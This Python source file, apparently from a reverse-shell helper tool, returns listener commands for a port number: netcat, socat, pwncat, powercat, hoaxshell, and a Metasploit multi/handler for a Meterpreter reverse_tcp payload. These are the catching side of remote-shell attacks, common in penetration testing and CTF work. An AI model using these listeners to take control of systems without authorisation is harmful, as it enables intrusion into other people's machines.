types = ["nc", "rustcat", "pwncat", "socat", "powercat", "msf", "hoaxshell", "ncat", "netcat", "rcat", "xnest"]

def listener(type, port):
    global types
    type = type.lower()
    try:
        port = int(port)
        if (port < 1 or port > 65535):
            raise Exception()
    except:
        return "Invalid port specified!"
    if (not (type in types or type == "")):
        return "Invalid type specified!"
    nc = f"""
**NetCat**
```sh
$ nc -lvnp {port}``````sh
$ ncat -lvnp {port}``````sh
$ ncat --ssl -lvnp {port}``````sh
$ stty raw -echo; (stty size; cat) | nc -lvnp {port}```"""
    rustcat = f"""
**RustCat**
```sh
$ rcat -lp {port}```"""
    pwncat = f"""
**PwnCat**
```sh
$ pwncat -lp {port}```"""
    socat = f"""
**SoCat**
```sh
$ socat -d -d TCP-LISTEN:{port} STDOUT``````sh
$ socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}```"""
    powercat = f"""
**PowerCat**
```sh
$ powercat -l -p {port}```"""
    msf = f"""
**MetaSploit**
```sh
$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport {port}; run"```"""
    hoaxshell = f"""
**HoaxShell**
```sh
$ python3 hoaxshell-listener.py -t cmd-curl -p {port}```"""
    xnest = """
**Xnest**
```sh
$ Xnest :1      #listens on port tcp/6001```"""
    if (type == ""):
        ret = nc + rustcat + pwncat + socat + powercat + msf + hoaxshell + xnest
    elif (type == types[0] or type == types[7] or type == types[8]):
        ret = nc
    elif (type == types[1] or type == types[9]):
        ret = rustcat
    elif (type == types[2]):
        ret = pwncat
    elif (type == types[3]):
        ret = socat
    elif (type == types[4]):
        ret = powercat
    elif (type == types[5]):
        ret = msf
    elif (type == types[6]):
        ret = hoaxshell
    elif (type == types[10]):
        ret = xnest
    else:
        ret = ""
    
    return ret
